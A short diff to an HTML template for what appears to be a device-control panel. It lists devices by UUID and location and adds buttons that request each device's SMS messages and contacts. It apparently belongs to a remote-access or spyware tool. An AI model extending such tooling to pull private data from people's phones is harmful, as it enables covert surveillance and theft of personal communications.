@@ -32,6 +32,8 @@
         <td>lat: {{.Location.Lat}} <br> lon: {{.Location.Lon}}</td>
         <td>
             <button onclick="sendCommand('ping', '{{.UUID}}')">Send Ping</button>
+            <button onclick="sendCommand('sms', '{{.UUID}}')">Request SMS</button>
+            <button onclick="sendCommand('contacts', '{{.UUID}}')">Request Contacts</button>
         </td>
     </tr>
     {{end}}
